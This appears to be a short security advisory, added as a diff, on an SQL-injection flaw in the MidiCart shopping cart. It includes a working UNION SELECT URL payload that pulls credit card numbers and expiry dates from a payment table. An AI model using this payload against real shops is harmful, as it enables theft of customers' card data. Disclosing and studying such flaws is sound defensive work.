@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/13514/info
+
+MidiCart PHP is prone to an SQL-injection vulnerability because it fails to properly sanitize user-supplied input before using it in an SQL query.
+
+A successful exploit could allow an attacker to compromise the application, access or modify data, or exploit vulnerabilities in the underlying database implementation.
+
+This issue is reported to affect both the PHP and ASP versions of MidiCart Shopping Cart.
+
+http://www.example.com/shop/item_list.php?secondgroup=-99 'UNION SELECT null, null, creditCard, ExpDate,null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null FROM card_payment
+
+http://www.example.com/path/item_list.asp?maingroup=Something&secondgroup=[SQL INJECTION] 
